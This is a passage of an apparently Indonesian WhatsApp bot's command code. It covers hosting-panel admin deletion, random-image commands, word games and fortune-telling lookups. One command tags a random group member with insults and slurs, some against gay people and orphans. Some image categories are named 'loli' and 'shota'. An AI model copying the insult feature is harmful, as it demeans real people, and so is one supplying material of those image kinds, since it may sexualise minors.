let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await sock.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("idnya")
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("idnya")
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
///########## [ Fun ]
case 'bego':
    case 'goblok':
    case 'janda':
    case 'perawan':
    case 'babi':
    case 'tolol':
    case 'pekok':
    case 'jancok':
    case 'pinter':
    case 'pintar':
    case 'asu':
    case 'bodoh':
    case 'gay':
    case 'lesby':
    case 'bajingan':
    case 'jancok':
    case 'anjing':
    case 'anjg':
    case 'anjj':
    case 'anj':
    case 'ngentod':
    case 'ngentot':
    case 'monyet':
    case 'mastah':
    case 'newbie':
    case 'bangsat':
    case 'bangke':
    case 'sange':
    case 'sangean':
    case 'dakjal':
    case 'horny':
    case 'wibu':
    case 'puki':
    case 'puqi':
    case 'peak':
    case 'pantex':
    case 'pantek':
    case 'setan':
    case 'iblis':
    case 'cacat':
    case 'yatim':
    case 'piatu': {
       if (!isGroup) return reply(mess.group);
      let member = participants.map(u => u.id).filter(v => v !== sock.user.jid)
      let org = member[Math.floor(Math.random() * member.length)];
      sock.sendMessage(m.chat, {
        text: `Anak ${command} di sini adalah @${org.split('@')[0]}`,
        mentions: [org]
      }, {
        quoted: m
      })
    }
    break

// ############# ANIME
    case 'akiyama':
    case 'ana':
    case 'art':
    case 'asuna':
    case 'ayuzawa':
    case 'boruto':
    case 'bts':
    case 'cartoon':
    case 'chiho':
    case 'chitoge':
    case 'cosplay':
    case 'cosplayloli':
    case 'cosplaysagiri':
    case 'cyber':
    case 'deidara':
    case 'doraemon':
    case 'elaina':
    case 'emilia':
    case 'erza':
    case 'exo':
    case 'gamewallpaper':
    case 'gremory':
    case 'hacker':
    case 'hestia':
    case 'hinata':
    case 'husbu':
    case 'inori':
    case 'islamic':
    case 'isuzu':
    case 'itachi':
    case 'itori':
    case 'jennie':
    case 'jiso':
    case 'justina':
    case 'kaga':
    case 'kagura':
    case 'kakasih':
    case 'kaori':
    case 'keneki':
    case 'kotori':
    case 'kurumi':
    case 'lisa':
    case 'madara':
    case 'megumin':
    case 'mikasa':
    case 'mikey':
    case 'miku':
    case 'minato':
    case 'mountain':
    case 'naruto':
    case 'neko2':
    case 'nekonime':
    case 'nezuko':
    case 'onepiece':
    case 'pentol':
    case 'pokemon':
    case 'programming':
    case 'randomnime':
    case 'randomnime2':
    case 'rize':
    case 'rose':
    case 'sagiri':
    case 'sakura':
    case 'sasuke':
    case 'satanic':
    case 'shina':
    case 'shinka':
    case 'shinomiya':
    case 'shizuka':
    case 'shota':
    case 'shortquote':
    case 'space':
    case 'technology':
    case 'tejina':
    case 'toukachan':
    case 'tsunade':
    case 'yotsuba':
    case 'yuki':
    case 'yulibocil':
    case 'yumeko': {
      m.reply("Loading 🔁")
      let heyy
      if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/akiyama.json')
      if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ana.json')
      if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/art.json')
      if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/asuna.json')
      if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ayuzawa.json')
      if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boneka.json')
      if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boruto.json')
      if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/bts.json')
      if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cecan.json')
      if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chiho.json')
      if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chitoge.json')
      if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cogan.json')
      if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplay.json')
      if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplayloli.json')
      if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplaysagiri.json')
      if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cyber.json')
      if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/deidara.json')
      if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/doraemon.json')
      if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/eba.json')
      if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/elaina.json')
      if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/emilia.json')
      if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/erza.json')
      if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/exo.json')
      if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/femdom.json')
      if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/freefire.json')
      if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gamewallpaper.json')
      if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/glasses.json')
      if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gremory.json')
      if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hekel.json')
      if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hestia.json')
      if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/husbu.json')
      if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/inori.json')
      if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/islamic.json')
      if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/isuzu.json')
      if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itachi.json')
      if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itori.json')
      if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jeni.json')
      if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jiso.json')
      if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/justina.json')
      if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaga.json')
      if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kagura.json')
      if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kakasih.json')
      if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaori.json')
      if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kartun.json')
      if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/katakata.json')
      if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/keneki.json')
      if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kotori.json')
      if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kpop.json')
      if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kucing.json')
      if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kurumi.json')
      if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/lisa.json')
      if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/loli.json')
      if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/madara.json')
      if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/megumin.json')
      if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikasa.json')
      if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikey.json')
      if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/miku.json')
      if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/minato.json')
      if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mobil.json')
      if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/motor.json')
      if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mountain.json')
      if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/naruto.json')
      if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko.json')
      if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko2.json')
      if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nekonime.json')
      if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nezuko.json')
      if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/onepiece.json')
      if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pentol.json')
      if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pokemon.json')
      if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/profil.json')
      if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/programming.json')
      if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pubg.json')
      if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randblackpink.json')
      if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime.json')
      if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime2.json')
      if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rize.json')
      if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rose.json')
      if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ryujin.json')
      if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sagiri.json')
      if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sakura.json')
      if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sasuke.json')
      if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/satanic.json')
      if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shina.json')
      if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinka.json')
      if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinomiya.json')
      if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shizuka.json')
      if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shota.json')
      if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tatasurya.json')
      if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/technology.json')
      if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tejina.json')
      if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/toukachan.json')
      if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tsunade.json')
      if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/waifu.json')
      if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallhp.json')
      if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallml.json')
      if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallnime.json')
      if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yotsuba.json')
      if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yuki.json')
      if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yulibocil.json')
      if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yumeko.json')
      let yeha = heyy[Math.floor(Math.random() * heyy.length)]
      sock.sendMessage(m.chat, {
        image: {
          url: yeha
        },
        caption: "",
        viewOnce: true,
        contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
  },
      }, {
        quoted: m
      })
    }
    break
    //############ [ GAME ]
case 'tebakkata': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakkata) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata
}, gamewaktu * 1000)
}
break 
case 'asahotak': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak
}, gamewaktu * 1000)
}
break           
case 'susunkata': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata
}, gamewaktu * 1000)
}
break           
case 'tebakgambar':
if (!isGroup) return reply(mess.group)
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await sock.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar) reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar2[from].jawaban}`);
delete tebakgambar
}, gamewaktu * 1000)
}
break
case 'tebakbendera': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakbendera[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera
}, gamewaktu * 1000)
}
break
case 'tebakkimia': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkimia = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkimia
}, gamewaktu * 1000)
}
break        
case 'family100': case 'f100': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family = {
soal: soal,
jawaban: famil,
waktu: setTimeout(async function () {
if (global.family) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family.jawaban
for (let i of jwb){teks += `\n${i}`}
reply(teks)
delete family
};
}, gamewaktu * 1000)
}

break   

/*
   PRIMBON
*/
case 'artimimpi': case 'tafsirmimpi': {
if (!text) return reply(`Contoh : ${cmd} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {
if (!text) return reply(`Contoh : ${cmd} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!text) return reply(`Contoh : ${cmd} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
sock.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (!text) return reply(`Contoh : ${cmd} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {
if (!ext)return reply(`Contoh : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
}
break
case  ' rejeki': case 'rezeki': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
